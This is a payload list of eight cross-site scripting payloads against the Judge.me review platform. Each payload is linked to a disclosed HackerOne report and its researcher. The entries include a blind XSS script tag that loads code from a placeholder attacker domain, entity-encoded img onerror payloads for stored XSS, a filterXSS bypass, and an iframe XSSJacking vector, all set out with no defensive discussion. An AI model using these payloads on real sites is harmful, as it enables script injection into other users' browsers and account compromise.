# Judge.me 

8 payloads.

### `bdcb5b61`

```
email:  ██████████@yopmail.com
password: ███████
tempmail: https://target.com/?judgeme-███████████ ( it can be necessary when you are login )
payload: "><script src=https://yourxssdomain></script>
```

— [Blind XSS via Feedback form.](https://hackerone.com/reports/1339034) · Judge.me  · [b3hlull](https://hackerone.com/b3hlull)

### `173a09bc`

```
https://target.com/avatar/█████████.png?;'onload=alert(document.domain)>
```

— [Self-XSS due to image URL can be eploited via XSSJacking techniques in review email](https://hackerone.com/reports/1397940) · Judge.me  · [penguinshelp](https://hackerone.com/penguinshelp)

### `29f2cad0`

```
https://<iframe src="https://target.com/[ID_OF_TARGET]?tab=public_profile">
```

— [Self-XSS due to image URL can be eploited via XSSJacking techniques in review email](https://hackerone.com/reports/1397940) · Judge.me  · [penguinshelp](https://hackerone.com/penguinshelp)

### `040f314d`

```
<![endif]-- onerror="<![endif]-->" onload="<img src=1 onerror='alert(1)' />">
```

— [Email templates XSS by filterXSS bypass](https://hackerone.com/reports/1404804) · Judge.me  · [caue](https://hackerone.com/caue) · $1,250.0

### `7b11fd84`

```
">&#60;img src=x onerror=prompt(&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#100;&#111;&#109;&#97;&#105;&#110;)>
```

**Parameter:** `name`
— [Stored XSS in Question edit from product name](https://hackerone.com/reports/1416672) · Judge.me  · [chupa__chups](https://hackerone.com/chupa__chups)

### `2b7710c7`

```
">&#60;"><img src=x onerror=prompt(document.domain)> img src=x onerror=prompt(&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#100;&#111;&#109;&#97;&#105;&#110;)>
```

**Parameter:** `name`
— [stored XSS on AliExpress Review Importer/Products when delete product](https://hackerone.com/reports/1425882) · Judge.me  · [chupa__chups](https://hackerone.com/chupa__chups)

### `a6decf58`

```
"><"><img src=x onerror=prompt(document.domain)> img src=x onerror=prompt(document.domain)>
```

**Parameter:** `name`
— [stored XSS on AliExpress Review Importer/Products when delete product](https://hackerone.com/reports/1425882) · Judge.me  · [chupa__chups](https://hackerone.com/chupa__chups)

### `9f11012f`

```
&#34;&#62;&#60;&#34;&#62;&#60;img src=x onerror=prompt(document.domain)&#62; img src=x onerror=prompt(document.domain)&#62;
```

**Parameter:** `name`
— [Stored XSS in Question edit for product name (bypass #1416672)](https://hackerone.com/reports/1428207) · Judge.me  · [chupa__chups](https://hackerone.com/chupa__chups)
